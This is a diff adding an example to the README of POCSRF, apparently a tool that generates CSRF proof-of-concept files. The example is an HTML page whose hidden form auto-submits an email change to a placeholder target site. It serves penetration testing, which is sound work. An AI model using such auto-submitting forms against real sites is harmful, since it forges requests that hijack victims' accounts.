@@ -24,6 +24,24 @@ POCSRF is designed to easily generate CSRF PoC files from the command line. Simp
     -of --filename: Name of the output file (default : CSRF_PoC.html)
     -v --verbose:   Verbose mode
 
+
+**Example Output:**
+
+    <html>
+      <head>
+        <title>PoC CSRF</title>
+      </head>
+      <body>
+        <form method=POST action=https://target_site.com/change_email/>
+          <input type="hidden" value=test@email.com name=email />
+          <input type="submit" value="Submit Request" />
+        </form>
+        <script>
+          document.forms[0].submit();
+        </script>
+      </body>
+    </html>
+    
 **Notes**
 
 Minimum version of python required is Python3 (Python 3.8 used to develop), binaries are available for:
